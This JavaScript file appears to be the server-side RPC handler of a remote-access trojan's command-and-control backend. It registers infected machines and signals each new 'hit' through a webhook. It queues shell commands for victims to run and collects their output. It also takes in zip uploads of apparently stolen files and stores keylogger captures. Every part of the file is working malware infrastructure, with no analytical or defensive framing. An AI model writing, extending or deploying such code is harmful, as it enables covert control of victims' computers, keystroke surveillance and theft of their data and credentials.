// language: JavaScript, file: tcp_rpc.js
import { sendHitWebhook } from './webhook.js';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import db, { UPLOAD_DIR } from './db.js';

const MAX_UPLOAD = Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024);
const MAX_RESULT = 32 * 1024 * 1024;
const UPLOAD_KEEP = 2;

async function authKey(key) {
  if (!key) return null;
  const [rows] = await db.query(`SELECT id, username FROM users WHERE account_key = ?`, [key]);
  return rows[0] || null;
}

async function pruneUploads(clientId) {
  const [rows] = await db.query(`
    SELECT id, stored_name FROM uploads
    WHERE client_id = ?
    ORDER BY created_at DESC
  `, [clientId]);

  for (let i = UPLOAD_KEEP; i < rows.length; i++) {
    const r = rows[i];
    try { fs.unlinkSync(path.join(UPLOAD_DIR, r.stored_name)); } catch {}
    await db.query(`DELETE FROM uploads WHERE id = ?`, [r.id]);
  }
}

export async function handleRpc(msg, remoteIp) {
  const ip = String(remoteIp || '').replace(/^::ffff:/, '');

  if (!msg || typeof msg !== 'object') return { error: 'bad request' };

  const cmd = msg.cmd;
  const user = await authKey(msg.key);
  if (!user) return { error: 'invalid key' };
  const uid = user.id;

  switch (cmd) {
    case 'register': {
      const hostname = String(msg.hostname || 'unknown').slice(0, 64);
      const [existingRows] = await db.query(`
        SELECT id FROM clients WHERE user_id = ? AND hostname = ?
      `, [uid, hostname]);

      if (existingRows.length > 0) {
        const existing = existingRows[0];
        await db.query(`UPDATE clients SET ip = ?, last_seen = ? WHERE id = ?`, [ip, Date.now(), existing.id]);
        return { ok: true, clientId: Number(existing.id) };
      }

      const [info] = await db.query(`
        INSERT INTO clients (user_id, \`key\`, hostname, ip, last_seen)
        VALUES (?, ?, ?, ?, ?)
      `, [uid, msg.key, hostname, ip, Date.now()]);

      sendHitWebhook(uid, hostname, ip).catch(() => {});

      return { ok: true, clientId: Number(info.insertId) };
    }

    case 'pull': {
      const clientId = Number(msg.clientId || 0);
      let client = null;
      if (clientId) {
        const [rows] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, uid]);
        client = rows[0];
      }
      if (!client) {
        const [rows] = await db.query(`
          SELECT id FROM clients WHERE user_id = ? AND ip = ?
          ORDER BY last_seen DESC LIMIT 1
        `, [uid, ip]);
        client = rows[0];
      }

      if (!client) return { id: null, clientId: null };

      await db.query(`UPDATE clients SET last_seen = ?, ip = ? WHERE id = ?`, [Date.now(), ip, client.id]);

      const [cmdRows] = await db.query(`
        SELECT id, shell, line FROM commands
        WHERE user_id = ? AND client_id = ? AND status = 'pending'
        ORDER BY created_at ASC LIMIT 1
      `, [uid, client.id]);

      if (cmdRows.length === 0) return { id: null, clientId: Number(client.id) };
      const c = cmdRows[0];

      await db.query(`UPDATE commands SET status = 'sent' WHERE id = ?`, [c.id]);
      return {
        id: Number(c.id),
        shell: c.shell,
        line: c.line,
        clientId: Number(client.id),
      };
    }

    case 'result': {
      if (!msg.id) return { error: 'missing id' };
      const [info] = await db.query(`
        UPDATE commands SET output = ?, status = 'done'
        WHERE id = ? AND user_id = ?
      `, [String(msg.output || '').slice(0, MAX_RESULT), msg.id, uid]);
      
      if (info.affectedRows === 0) return { error: 'not found' };
      return { ok: true };
    }

    case 'upload': {
      const clientId = Number(msg.clientId || 0);
      const name = String(msg.name || 'upload.zip').slice(0, 128).replace(/[^\w.\-]/g, '_');
      if (typeof msg.data !== 'string' || !msg.data) return { error: 'no data' };

      let bytes;
      try { bytes = Buffer.from(msg.data, 'base64'); }
      catch { return { error: 'bad base64' }; }

      if (bytes.length === 0) return { error: 'empty' };
      if (bytes.length > MAX_UPLOAD) return { error: 'too large' };
      if (!(bytes[0] === 0x50 && bytes[1] === 0x4B)) return { error: 'not a zip' };

      let client = null;
      if (clientId) {
        const [rows] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, uid]);
        client = rows[0];
      }
      if (!client) {
        const [rows] = await db.query(`
          SELECT id FROM clients WHERE user_id = ? AND ip = ?
          ORDER BY last_seen DESC LIMIT 1
        `, [uid, ip]);
        client = rows[0];
      }
      if (!client) return { error: 'client not registered' };

      const storedName = `${crypto.randomUUID()}.zip`;
      const dest = path.join(UPLOAD_DIR, storedName);
      try { fs.writeFileSync(dest, bytes, { mode: 0o600 }); }
      catch { return { error: 'write failed' }; }

      const [info] = await db.query(`
        INSERT INTO uploads (user_id, client_id, filename, stored_name, size, created_at)
        VALUES (?, ?, ?, ?, ?, ?)
      `, [uid, client.id, name, storedName, bytes.length, Date.now()]);

      await pruneUploads(client.id);

      return { ok: true, uploadId: Number(info.insertId), filename: name, size: bytes.length };
    }

    case 'keylog': {
      const clientId = Number(msg.clientId || 0);
      const data = String(msg.data || '').slice(0, 65536);
      if (!data) return { error: 'empty' };

      let client = null;
      if (clientId) {
        const [rows] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, uid]);
        client = rows[0];
      }
      if (!client) {
        const [rows] = await db.query(`
          SELECT id FROM clients WHERE user_id = ? AND ip = ?
          ORDER BY last_seen DESC LIMIT 1
        `, [uid, ip]);
        client = rows[0];
      }
      if (!client) return { error: 'client not registered' };

      await db.query(`
        INSERT INTO keylogs (user_id, client_id, data, created_at)
        VALUES (?, ?, ?, ?)
      `, [uid, client.id, data, Date.now()]);

      await db.query(`
        DELETE FROM keylogs WHERE client_id = ? AND id NOT IN (
          SELECT id FROM (
            SELECT id FROM keylogs WHERE client_id = ? ORDER BY id DESC LIMIT 2000
          ) AS tmp
        )
      `, [client.id, client.id]);

      return { ok: true, len: data.length };
    }

    default:
      return { error: `unknown cmd: ${cmd}` };
  }
}

export async function handleTcpLine(line, sock, remoteIp) {
  let reply;
  try {
    reply = await handleRpc(JSON.parse(line), remoteIp);
  } catch {
    reply = { error: 'bad json' };
  }
  try { sock.write(JSON.stringify(reply) + '\n'); } catch {}
  sock.end();
}